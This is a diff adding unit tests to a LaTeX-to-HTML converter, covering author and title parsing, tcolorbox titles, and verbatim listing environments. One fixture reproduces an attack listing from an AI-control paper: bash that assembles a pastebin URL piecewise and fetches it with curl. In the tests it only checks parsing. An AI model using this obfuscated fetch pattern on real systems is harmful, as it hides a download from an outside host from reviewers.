@@ -13,6 +13,228 @@ const DOC = (body: string) =>
   `\\documentclass{article}\\begin{document}\n${body}\n\\end{document}`;
 
 describe("convertLatexToHtml", () => {
+  it("splits marker-separated authors and drops superscript affiliations", () => {
+    const { meta } = convert(
+      DOC(
+        "\\title{T}\\author{David Lindner$^{*1}$, Charlie Griffin$^{*2,3}$, " +
+          "Roland S. Zimmermann$^{1}$ Geoffrey Irving$^{2}$}\\maketitle\nBody.",
+      ),
+    );
+    expect(meta.authors).toEqual([
+      "David Lindner",
+      "Charlie Griffin",
+      "Roland S. Zimmermann",
+      "Geoffrey Irving",
+    ]);
+  });
+
+  it("strips the twocolumn front-matter block and ICML postamble", () => {
+    const { html } = convert(
+      DOC(
+        "\\twocolumn[\\icmltitle{My Title}\\icmlkeywords{Machine Learning, ICML}]\n" +
+          "\\printAffiliationsAndNotice{\\icmlEqualContribution}\n" +
+          "\\begin{abstract}The abstract.\\end{abstract}\n\\section{Introduction}\nBody.",
+      ),
+    );
+    expect(html).not.toContain("My Title");
+    expect(html).not.toContain("Machine Learning, ICML");
+    expect(html).not.toContain("[");
+    expect(html).toContain("The abstract.");
+    expect(html).toContain("Introduction");
+  });
+
+  it("extracts ICML front-matter title and authors into meta", () => {
+    const { meta, html } = convert(
+      DOC(
+        [
+          "\\twocolumn[",
+          "\\icmltitle{Ctrl-Z: Controlling AI Agents via Resampling}",
+          "\\icmlsetsymbol{equal}{*}",
+          "\\begin{icmlauthorlist}",
+          "\\icmlauthor{Aryan Bhatt}{rwdrs}",
+          "\\icmlauthor{Cody Rushing}{equal,rwdrs,mats}",
+          "\\icmlauthor{Buck Shlegeris}{rwdrs}",
+          "\\end{icmlauthorlist}",
+          "\\icmlaffiliation{rwdrs}{Redwood Research}",
+          "\\icmlcorrespondingauthor{Aryan Bhatt}{aryan@rdwrs.com}",
+          "]",
+          "\\begin{abstract}The abstract.\\end{abstract}\nBody.",
+        ].join("\n"),
+      ),
+    );
+    expect(meta.title).toBe("Ctrl-Z: Controlling AI Agents via Resampling");
+    expect(meta.authors).toEqual([
+      "Aryan Bhatt",
+      "Cody Rushing",
+      "Buck Shlegeris",
+    ]);
+    // The front-matter block still strips from the body.
+    expect(html).not.toContain("Ctrl-Z");
+    expect(html).not.toContain("rwdrs");
+  });
+
+  it("drops footnote-sentence residue from author blocks, keeping real names", () => {
+    // Observed on 2411.17693v1: the \thanks body inside the superscript
+    // marker math survived as authors[1].
+    const { meta } = convert(
+      DOC(
+        "\\title{T}\\author{Jiaxin Wen$^{1}\\thanks{Equal contribution, order was randomized.}$, " +
+          "Vivek Hebbar$^{2*}$, J. R. Smith$^2$, Guido van der Berg$^3$\\\\" +
+          "$^1$Tsinghua University $^2$Redwood Research}\\maketitle\nBody.",
+      ),
+    );
+    expect(meta.authors).toEqual([
+      "Jiaxin Wen",
+      "Vivek Hebbar",
+      "J. R. Smith",
+      "Guido van der Berg",
+    ]);
+  });
+
+  it("splits thin-space-glue author runs into separate names", () => {
+    // Observed on 2312.06942v5: "Buck Shlegeris Kshitij Sachan Fabien Roger"
+    // fused into one entry.
+    const { meta } = convert(
+      DOC(
+        "\\title{T}\\author{\\textbf{Ryan Greenblatt$^*$ \\,\\,\\,\\, Buck Shlegeris " +
+          "\\,\\,\\,\\, Kshitij Sachan \\,\\,\\,\\, Fabien Roger}\\\\\\\\ Redwood Research}" +
+          "\\maketitle\nBody.",
+      ),
+    );
+    expect(meta.authors).toEqual([
+      "Ryan Greenblatt",
+      "Buck Shlegeris",
+      "Kshitij Sachan",
+      "Fabien Roger",
+    ]);
+  });
+
+  it("strips control-space glue instead of rejecting names as backslash residue", () => {
+    // Observed on 2604.28182v1: "Roland S.\ Zimmermann" and
+    // "Scott Emmons\footnotemark[2]\ \footnotemark[3]" kept a bare "\"
+    // after macro stripping, and the residue filter dropped both authors.
+    const { meta } = convert(
+      DOC(
+        "\\title{T}\\author{Scott Emmons\\footnotemark[2]\\ \\footnotemark[3], " +
+          "Roland S.\\ Zimmermann$^{1}$}\\maketitle\nBody.",
+      ),
+    );
+    expect(meta.authors).toEqual(["Scott Emmons", "Roland S. Zimmermann"]);
+  });
+
+  it("splits \\qquad-glued author runs into separate names", () => {
+    // Observed on 2604.16286v2: the five names fused into one 63-char
+    // candidate, failed the name-length cap, and the whole byline vanished.
+    const { meta } = convert(
+      DOC(
+        "\\title{T}\\author{Eric Gan \\qquad Aryan Bhatt \\qquad Buck Shlegeris " +
+          "\\qquad Julian Stastny \\qquad Vivek Hebbar}\\maketitle\nBody.",
+      ),
+    );
+    expect(meta.authors).toEqual([
+      "Eric Gan",
+      "Aryan Bhatt",
+      "Buck Shlegeris",
+      "Julian Stastny",
+      "Vivek Hebbar",
+    ]);
+  });
+
+  it("defuses parbox author cells — the nested \\\\ starts the affiliation", () => {
+    // Observed on 2604.28182v1: "Eyon Jang MATS", "Scott Emmons Anthropic" —
+    // each cell glues "Name \\ Affiliation" inside the \parbox body arg, so
+    // the top-level-only line-break truncation never fired.
+    const { meta, warnings } = convert(
+      DOC(
+        "\\title{Exploration Hacking: Can LLMs Learn to \\\\Resist RL Training?}" +
+          "\\author{\\parbox[t]{0.3\\textwidth}{\\raggedright{}Eyon Jang\\footnotemark[1]\\\\\\mdseries{}MATS}" +
+          "\\And \\parbox[t]{0.3\\textwidth}{\\raggedright{}Scott Emmons\\footnotemark[2]\\ \\footnotemark[3]\\\\\\mdseries{}Anthropic}" +
+          "\\And \\parbox[t]{0.35\\textwidth}{\\raggedright{}Roland S.\\ Zimmermann\\footnotemark[2]\\\\\\mdseries{}Google DeepMind}}" +
+          "\\maketitle\nBody.",
+      ),
+    );
+    // The title's "\\Resist" also must not lose "Resist" to the macro strip.
+    expect(meta.title).toBe(
+      "Exploration Hacking: Can LLMs Learn to Resist RL Training?",
+    );
+    expect(meta.authors).toEqual([
+      "Eyon Jang",
+      "Scott Emmons",
+      "Roland S. Zimmermann",
+    ]);
+    expect(
+      warnings.filter((w) => w.detail.startsWith("author-block fragment")),
+    ).toEqual([]);
+  });
+
+  it("warns when a title drops an unexpanded macro", () => {
+    const { meta, warnings } = convert(
+      DOC("\\title{The \\mysteryname{} Benchmark}\\maketitle\nBody."),
+    );
+    expect(meta.title).toBe("The Benchmark");
+    expect(warnings).toContainEqual(
+      expect.objectContaining({
+        code: "meta",
+        detail: "title drops unexpanded macro \\mysteryname",
+      }),
+    );
+  });
+
+  it("prefers \\icmltitle over a coexisting pdf-stub \\title, and strips \\thanks from \\icmlauthor", () => {
+    const { meta } = convert(
+      "\\documentclass{article}\\title{pdf-meta-title}\\begin{document}\n" +
+        "\\twocolumn[\\icmltitle{Real Displayed Title}]\n" +
+        "\\begin{icmlauthorlist}" +
+        "\\icmlauthor{Aryan Bhatt\\thanks{Equal contribution.}}{rwdrs}" +
+        "\\icmlauthor{Cody Rushing}{rwdrs}" +
+        "\\end{icmlauthorlist}\nBody.\n\\end{document}",
+    );
+    expect(meta.title).toBe("Real Displayed Title");
+    expect(meta.authors).toEqual(["Aryan Bhatt", "Cody Rushing"]);
+  });
+
+  it("accepts lowercase-stylized, particle, and parenthetical name shapes", () => {
+    const { meta, warnings } = convert(
+      DOC(
+        "\\title{T}\\author{danah boyd \\and Gerard 't Hooft \\and " +
+          "Rob op den Akker \\and Ming Li (Li Ming in native script)}" +
+          "\\maketitle\nBody.",
+      ),
+    );
+    expect(meta.authors).toEqual([
+      "danah boyd",
+      "Gerard 't Hooft",
+      "Rob op den Akker",
+      "Ming Li (Li Ming in native script)",
+    ]);
+    expect(
+      warnings.filter((w) => w.detail.startsWith("author-block fragment")),
+    ).toEqual([]);
+  });
+
+  it("warns on author-block fragments the residue filter rejects", () => {
+    const { meta, warnings } = convert(
+      DOC("\\title{T}\\author{Jane Doe, order was randomized}\\maketitle\nBody."),
+    );
+    expect(meta.authors).toEqual(["Jane Doe"]);
+    expect(warnings).toContainEqual(
+      expect.objectContaining({
+        code: "meta",
+        detail: 'author-block fragment dropped: "order was randomized"',
+      }),
+    );
+  });
+
+  it("keeps terminal periods of initials while trimming stray markers", () => {
+    const { meta } = convert(
+      DOC(
+        "\\title{T}\\author{Ann B.$^{1}$ \\and Hinton G. E. \\and " +
+          "Buck Shlegeris*}\\maketitle\nBody.",
+      ),
+    );
+    expect(meta.authors).toEqual(["Ann B.", "Hinton G. E.", "Buck Shlegeris"]);
+  });
+
   it("renders prose, sections, and emphasis", () => {
     const { html } = convert(
       DOC("\\section{Introduction}\nHello \\emph{world}."),
@@ -693,6 +915,47 @@ describe("convertLatexToHtml", () => {
     );
   });
 
+  it("keeps ordinary colon compounds in box titles, dropping only \\ref labels", () => {
+    const { html } = convert(
+      "\\documentclass{article}" +
+        "\\newtcolorbox{mixbox}[1][]{title={Mixture (ratio a:b) at (scale x:y)},#1}" +
+        "\\newtcolorbox{refbox}[1][]{title={Recap (see sec:discussion)},#1}" +
+        "\\begin{document}" +
+        "\\begin{mixbox}One.\\end{mixbox}\\begin{refbox}Two.\\end{refbox}" +
+        "\\end{document}",
+    );
+    // Genuine colon compounds survive verbatim…
+    expect(html).toContain("Mixture (ratio a:b) at (scale x:y)");
+    // …while the unresolved-\ref parenthetical is still dropped.
+    expect(html).toContain(">Recap</div>");
+    expect(html).not.toContain("sec:discussion");
+  });
+
+  it("renders a direct tcolorbox title= option as a title chip", () => {
+    const { html } = convert(
+      DOC(
+        "\\begin{tcolorbox}[enhanced,title={Key claim, restated},colback=custom]" +
+          "Box body.\\end{tcolorbox}",
+      ),
+    );
+    expect(html).toContain('class="ax-box-title"');
+    expect(html).toContain(">Key claim, restated</div>");
+    expect(html).toContain("Box body.");
+    expect(html).not.toContain("enhanced"); // options never leak
+    expect(html).not.toContain("colback");
+  });
+
+  it("keeps a titleless tcolorbox chip-free with no option leakage", () => {
+    const { html } = convert(
+      DOC(
+        "\\begin{tcolorbox}[enhanced,colframe=blue!50,coltitle=black]Plain body.\\end{tcolorbox}",
+      ),
+    );
+    expect(html).not.toContain("ax-box-title");
+    expect(html).toContain("Plain body.");
+    expect(html).not.toContain("coltitle"); // "coltitle=" is not "title="
+  });
+
   it("honors an explicit coltitle= on the title chip", () => {
     const { html } = convert(
       "\\documentclass{article}" +
@@ -856,6 +1119,53 @@ describe("convertLatexToHtml", () => {
     expect(html).toContain(">Header</td>");
     expect(html).not.toContain("2*Header");
     expect(html).toContain('colspan="2"');
+  });
+
+  it("keeps custom listing environments verbatim (odd $ must not desync)", () => {
+    // Observed on Ctrl-Z (2504.10374v1): \DeclareTCBListing'd listingsbox
+    // bodies parsed as LaTeX, an odd number of $s swallowed the \end into
+    // math, environment pairing desynced, and the whole appendix rendered as
+    // literal TeX.
+    const result = convert(
+      "\\documentclass{article}" +
+        "\\DeclareTCBListing{listingsbox}{O{}m!O{}}{listing style=#2,#3}" +
+        "\\begin{document}" +
+        "\\section{Attack}\n" +
+        "\\begin{listingsbox}{bash}\n" +
+        'json_data=\'{"config": {"host": "pastebin"}}\'\n' +
+        "echo $json_data > config.json\n" +
+        "host=$(jq -r '.config.host' config.json)\n" +
+        'curl "$host.com$path"\n' +
+        "\\end{listingsbox}\n" +
+        "\\section{Deferral protocols}\nStill prose.\n" +
+        "\\end{document}",
+    );
+    // The body renders as a verbatim code block, args dropped.
+    expect(result.html).toContain('class="ax-code"');
+    expect(result.html).toContain("echo $json_data");
+    expect(result.html).not.toContain(">bash");
+    // Sections after the listing still convert (no raw-TeX fallout)…
+    expect(result.html).not.toContain("\\section{");
+    expect(result.toc.map((t) => t.title)).toContain("Deferral protocols");
+    // …and nothing needed env repair.
+    expect(result.warnings.filter((w) => w.code === "env-repair")).toEqual([]);
+    expect(result.html).not.toContain("listingsbox");
+  });
+
+  it("consumes \\lstnewenvironment declarations and keeps their uses verbatim", () => {
+    const { html } = convert(
+      "\\documentclass{article}" +
+        "\\lstnewenvironment{pycode}[1][]{\\lstset{language=Python,#1}}{}" +
+        "\\begin{document}" +
+        "\\begin{pycode}[caption=Ex]\nassert f\"{x}: ok\" == y\n\\end{pycode}\n" +
+        "After text." +
+        "\\end{document}",
+    );
+    expect(html).toContain('class="ax-code"');
+    expect(html).toContain("assert f");
+    expect(html).not.toContain("caption=Ex");
+    expect(html).toContain("After text.");
+    expect(html).not.toContain("pycode");
   });
 
   it("warns when counter-manipulation commands are stripped", () => {
